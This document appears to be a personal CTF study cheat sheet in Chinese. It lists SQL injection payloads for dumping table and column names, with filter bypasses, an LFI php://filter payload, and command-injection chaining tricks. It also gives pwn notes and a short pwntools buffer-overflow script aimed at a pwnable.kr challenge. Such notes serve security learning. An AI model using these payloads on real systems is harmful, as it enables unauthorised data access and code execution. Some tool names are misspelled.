# CTF note
## WEB

### SQL injection

select database()

group_concat(table_name) from information_schema.tables where table_schema=‘database()’
再看某個資料庫的table (單引號要提換成實際database name)

group_concat(column_name) from information_schema.columns where table_name='wargame2key'-- -

or (尾端單引號內容可換成hex 然後不需要單引號 , 不行的話試試看單引號不要拿掉)

group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#

---

已知欄位數量 database()名稱

(`limit`參數為開始欄位id,顯示數量)

查看表個名:
(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='置換成db名稱' limit 0,1)

查看欄位名:
(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='置換成表格名稱' limit 1,1)

取得欄位內容:
(select flag from flag limit 1,1)

### LFI

> ?page=`php://filter/read=convert.base64-encode/resource=path`

### command injection

**串接指令** : `反引號` , `&&` , `|` , `;`

**讀取檔案** : `cat` , `head` , `tail` , `sort` , `more`

**檔名被過濾** : 萬用字元繞過 (ex:flag.txt --> `cat fla*`)

## PWN

查看GOT : `readelf -a <filename>`

x86 64位元 calling convention

a(1,2,3,4,5,6,7,8,9)

```
136   4004f5:   6a 09                   push   0x9
137   4004f7:   6a 08                   push   0x8
138   4004f9:   6a 07                   push   0x7
139   4004fb:   41 b9 06 00 00 00       mov    r9d,0x6
140   400501:   41 b8 05 00 00 00       mov    r8d,0x5
141   400507:   b9 04 00 00 00          mov    ecx,0x4
142   40050c:   ba 03 00 00 00          mov    edx,0x3
143   400511:   be 02 00 00 00          mov    esi,0x2
144   400516:   bf 01 00 00 00          mov    edi,0x1
```


### asm intel

參數存入rigister順序 `printf(rdi,rsi,rdx,rcx,r8,r9)`

[ref](http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/)

### reverse

- objump -d -M intel filename

### pwnalbe

- 32bit frame

  - gcc -m32

- protect
  
  - gcc -fno-stack-protector file.c(關閉canary)

- gdb調用技巧

  - disas main

  - info func
 
  - x $ebp+8

- pwntools
 
  - OFFSET  

    - cyclib(50)
 
    - cyclib_find('aa') 

`pwntools 基本用法`
```python
from pwn import *
context(log_level = 'debug')
playload = 'A'*52 + p32(0xcafebabe)
r = remote('pwnable.kr',9000)
#r.recvuntil('overflow me :')
r.send(playload)
r.interactive()
```
w
